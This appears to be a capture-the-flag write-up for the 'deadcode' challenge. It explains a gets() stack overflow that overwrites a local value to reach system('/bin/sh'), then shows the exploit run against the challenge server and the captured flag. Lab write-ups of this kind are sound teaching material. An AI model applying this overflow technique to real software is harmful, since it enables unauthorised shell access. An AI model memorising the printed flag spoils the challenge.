For this challenge, we are presented with a single binary named "deadcode". When we run it, we get the following output and it hangs waiting for user input.

```
$ ./deadcode 

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

What features would you like to see in my app?
```

Here's the disassembly of the main() function.

```asm
   0x0000000000401195 <+0>:     push   rbp
   0x0000000000401196 <+1>:     mov    rbp,rsp
   0x0000000000401199 <+4>:     sub    rsp,0x20
   0x000000000040119d <+8>:     mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004011a5 <+16>:    mov    eax,0x0
   0x00000000004011aa <+21>:    call   0x401152 <buffer_init>
   0x00000000004011af <+26>:    lea    rdi,[rip+0xe52]        # 0x402008
   0x00000000004011b6 <+33>:    call   0x401030 <puts@plt>
   0x00000000004011bb <+38>:    lea    rdi,[rip+0xeb6]        # 0x402078
   0x00000000004011c2 <+45>:    call   0x401030 <puts@plt>
   0x00000000004011c7 <+50>:    lea    rax,[rbp-0x20]
   0x00000000004011cb <+54>:    mov    rdi,rax
   0x00000000004011ce <+57>:    mov    eax,0x0
   0x00000000004011d3 <+62>:    call   0x401060 <gets@plt>
   0x00000000004011d8 <+67>:    mov    eax,0xdeadc0de
   0x00000000004011dd <+72>:    cmp    QWORD PTR [rbp-0x8],rax
   0x00000000004011e1 <+76>:    jne    0x401200 <main+107>
   0x00000000004011e3 <+78>:    lea    rdi,[rip+0xebe]        # 0x4020a8
   0x00000000004011ea <+85>:    call   0x401030 <puts@plt>
   0x00000000004011ef <+90>:    lea    rdi,[rip+0xed5]        # 0x4020cb
   0x00000000004011f6 <+97>:    mov    eax,0x0
   0x00000000004011fb <+102>:   call   0x401050 <system@plt>
   0x0000000000401200 <+107>:   mov    eax,0x0
   0x0000000000401205 <+112>:   leave  
   0x0000000000401206 <+113>:   ret    
```

In the prologue we can see that it's making 32 bytes (0x20) of space on the stack and then setting the last eight bytes to 0x0. Next it calls a buffer_init() function which disables buffering on standard input, standard out, and standard error which is commonly done in these types of problems. Next, it prints out the two lines we saw when we ran it by calling puts() twice. Next it calls gets() to read input from the user and stores it starting at the 32 byte space it made on the stack. Finally it checks to see whether the value represented by the last eight bytes of the space it made on the stack (and which it had previous set to 0x0) is equal to 0xdeadc0de and if not it jumps to the epilogue and exits. If the last eight bytes do contain that value, it falls through into code which prints out another string using puts() and then calls system("/bin/sh").

The gets() function reads user input until it encounters a newline character and there is no way for the programmer to limit the maximum amount of characters which the user sends before sending a newline character. Therefore, all that we need to do in order to write 0xdeadcode into the last eight bytes of the buffer is to send 24 characters of filler followed by the little-endian representation of the number 0xdeadcode.

Here's the output when run against the challenge server:

```
$ python deadcode.py REMOTE
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[*] Switching to interactive mode


Maybe this code isn't so dead...
$ cat flag.txt
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```

